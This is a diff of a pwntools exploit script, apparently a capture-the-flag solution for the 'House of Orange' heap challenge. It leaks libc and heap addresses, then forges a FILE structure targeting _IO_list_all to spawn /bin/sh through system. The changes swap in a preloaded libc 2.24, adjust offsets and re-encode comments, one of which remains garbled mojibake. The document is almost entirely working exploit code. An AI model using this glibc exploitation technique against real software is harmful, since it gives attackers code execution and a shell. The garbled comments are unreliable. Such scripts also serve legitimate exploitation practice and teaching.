@@ -1,9 +1,15 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
 from pwn import *
 #context(os='linux', arch='amd64', log_level='debug')
 
-io = process('./orange')
+env = {}
+env = {'LD_PRELOAD' : './libc-2.24.so'}
+io = process('./orange', env=env)
+
 elf = ELF('./orange')
-libc = ELF('/lib/x86_64-linux-gnu/libc-2.24.so')
+libc = ELF('libc-2.24.so')
 
 IO_file_jumps_offset = libc.sym['_IO_file_jumps']
 IO_str_underflow_offset = libc.sym['_IO_str_underflow']
@@ -54,7 +60,7 @@ build(0x1000,'CCCC',3,3)
 build(0x400,'D'*8,4,4)
 see()
 io.recvuntil('Name of house : DDDDDDDD')
-libc_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x3c2760-0x668
+libc_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x397b00-0x668
 print "libc_base : " +hex(libc_base)
 system_addr = libc_base+libc.symbols['system']
 log.info('system_addr:'+hex(system_addr))
@@ -79,13 +85,13 @@ log.info('heap_base:'+hex(heap_base))
 
 binsh_addr = heap_base +0x140
 
-pad ="/bin/sh\x00"   # binsh µØÖ·
+pad ="/bin/sh\x00"   # binsh address
 pad = pad.ljust(0x410,"\x00")
 pad += p32(6)+p32(6)+p64(0)
 
-stream = p64(0)+p64(0x61)  # fp->_flagsÎª0   
+stream = p64(0)+p64(0x61)  # fp->_flags = 0
 stream += p64(0xddaa)+p64(IO_list_all-0x10)
-stream +=p64(1)+p64(0x7ffffffffffd) # (fp->_IO_write_ptr - fp->_IO_write_base )ÊÇÒ»¸öºÜ´óµÄÕıÖµ,Ô¶´óÓÚ(fp->_IO_buf_end - fp->_IO_buf_base)
+stream +=p64(1)+p64(0x7ffffffffffd) # (fp->_IO_write_ptr - fp->_IO_write_base )  æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„æ­£å€¼,è¿œå¤§äº  (fp->_IO_buf_end - fp->_IO_buf_base)
 stream +=p64(0)
 stream +=p64(0)+p64((binsh_addr-100)/2)  # fp->_IO_buf_base=0 ,  fp->_IO_buf_end=(binsh_addr-100)/2
 stream = stream.ljust(0xc0,"\x00")
